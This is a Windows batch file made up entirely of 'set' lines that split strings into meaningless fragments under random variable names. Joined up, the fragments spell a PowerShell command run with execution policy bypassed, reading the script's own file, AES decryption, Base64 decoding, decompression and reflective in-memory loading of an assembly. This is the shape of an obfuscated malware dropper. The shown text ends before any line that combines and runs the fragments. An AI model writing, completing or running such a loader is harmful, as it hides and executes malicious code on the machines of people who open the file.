@echo off
set "CJtxfHlrAt=in"
set "VzuBClRNue=ll"
set "ZyXgbFqavm=he"
set "elorZLfDPS=we"
set "xffuPytUAO=0\"
set "jfPLgFHoeC=rs"
set "yjBRGfGjhd=s\"
set "VdckUGniqu=xe"
set "AhUxLasmpM=ws"
set "ZgxwDiavyh=Wi"
set "FosEgQmlsD=ll"
set "HxEAGUkXys=ow"
set "YXLKPWYhaf=\W"
set "NIwAnBwrrF=py"
set "LMIUatsyUj=\v"
set "mJUJehoFDu=we"
set "OTxycVcnQz=:\"
set "OTTajjsqBX=y "
set "KiwjxnVnmO=Sy"
set "jTjOPnHhvG=1."
set "fRfzEXPVTe=Po"
set "HisZLybucs=32"
set "oQIfgujlIt=do"
set "sQfHEdNRcO=.e"
set "MMyGFvOWMe=rS"
set "sXlohltVku=co"
set "nAXkmorAcw=nd"
set "pZcNnxKjAj=he"
set "DCluRBCXQJ=st"
set "veiDXJKojU= /"
set "XdWfJdYfEh=em"
set "leFLlLEVrK= C"
set "iDDitDrhMT=po"
set "TulUGrKfjx= %~dp0"
set "bfyMhhpGIS=cd"
set "ZIBJcYttoL=CFxo"
set "LfnPWNvtKH=Disp"
set "zwEMGrLdMl=le  "
set "rrjnmVcBMo=Disp"
set "aiFWXJqxGx= '')"
set "eKDRKRcsCL=);$J"
set "URCPBoMTDR=tion"
set "yicXOQqeoD=urit"
set "paPSLNffff=zuZI"
set "ACGduHAdhd=orF'"
set "HNLkELUQIt=gnir"
set "cQsPPMrlqP= '')"
set "LvleRpeHzB=X = "
set "OtrguLOHFS=.Len"
set "iCSOHUsUDR== [S"
set "MpzednLgGr=;$Rw"
set "yZiUXBiZgd=rity"
set "sWLEBDWgCR=Hat."
set "wsfXqKBXJg=bstr"
set "pNVCldfYSb=rity"
set "OahGARInXi=tem."
set "WJnsGydTnO=$oMx"
set "UKIAXkekCa=1..-"
set "PPrtIUxGvn=ct S"
set "pkoOcZQEAK=u = "
set "ltjkGbBEsF=[IO."
set "sEdGAXTiqm=.Mod"
set "pCUoGLntXn=.Mem"
set "OCYJiEtwQe=$PXo"
set "oxNrTyAqot=ionM"
set "OGjNbGcJof=se()"
set "EYfBHGbazG=Star"
set "fSjqqNgUKP=form"
set "TuMdqyLENp=);$s"
set "SWmKPRPtBW=null"
set "PiVJmYbkPS=-4] "
set "CVmyJGQyEF='0Pg"
set "JoIUYhPGXO=Wu, "
set "SubAaOqyat=e = "
set "CmoNVHElml=Rr.D"
set "gNWObChYkC== $o"
set "qqEgKxNBnF=('%*'"
set "HaroHQnplR=-ep "
set "STdRKEuwfl=)($P"
set "mUMdSMEdyd=.Cry"
set "abBtVbWWWv=yste"
set "uBjsBmeZSX=Mxcd"
set "waQesUSYDp=sVg."
set "smKpRTOZnX=gjYA"
set "oPJXoxYzJp=ress"
set "RPtFZbXPOD=RpPy"
set "niTQXVZHZL=oryS"
set "tKlVRiUWbe=);$o"
set "BcUuthHDqK=J.En"
set "XEcMnnQIfQ===')"
set "gDFOMsfERJ=.-16"
set "rPoCRPvmBP=r = "
set "gnWsoeYfXX=comm"
set "fPMjDEzVTD=::De"
set "WvjKwkgZiD= [st"
set "wspmobSSIO=RmAx"
set "DMqXfJsYXK=$SoB"
set "ObzuEqHMkn=gth)"
set "fpWWjKdfmi=grap"
set "yCQqNwhobH=pStr"
set "sWJHIZsSab=$scI"
set "aLeVBkILfI=New-"
set "cRSpSvdgZU=ewLi"
set "pVLgJtfATj=).Sp"
set "IEaTEiRpnK=($WW"
set "ZkBObSIufT=.Con"
set "rmkZnhelfv=iron"
set "yeImLmntqG=ddin"
set "dYsZFLzOVa=onve"
set "GbCiXIWSzk=]::("
set "lVELMpFuKC=ck($"
set "qqcnscdiAQ=eMVs"
set "OUFXgbGlkw=tryP"
set "NnnNaOiubL=m.IO"
set "ChThinINLb=$Fin"
set "kUAmkkxLwj=flec"
set "BfqWbkemld=ert]"
set "uAPlPNoWmG=$SoB"
set "tVjrUqgOUg=.Cop"
set "EpyeNyGcZR=[Sys"
set "RMKigiplhT=RwWM"
set "ywYPjBFqHH=eam("
set "mBCMgytlRZ=in $"
set "SHcCoKzymY=:: '"
set "roGRdWTJSx=.Cre"
set "qRjziJxUAI=.Cry"
set "FVjqIZWnGD=join"
set "OtCaYkNdQb=ress"
set "RhDxjdfHqt=S46e"
set "xUjKCqJJhz=Comp"
set "tOveSoqdmf=comp"
set "EtEVIdIJdH=('%~f0'"
set "efcqPnmLGn=ct S"
set "BeaLPnCMAo=Invo"
set "WqzIvSjgtG=oMxc"
set "wbYDwzdpoJ=]::C"
set "NMJZVfBqiD=g = "
set "WRYhIFXAGU=mory"
set "wRRBVIYYzY=rans"
set "SVrkVYkvia=XL);"
set "BjQpPqWfrQ=bypa"
set "DeYDpZQJHp=  $L"
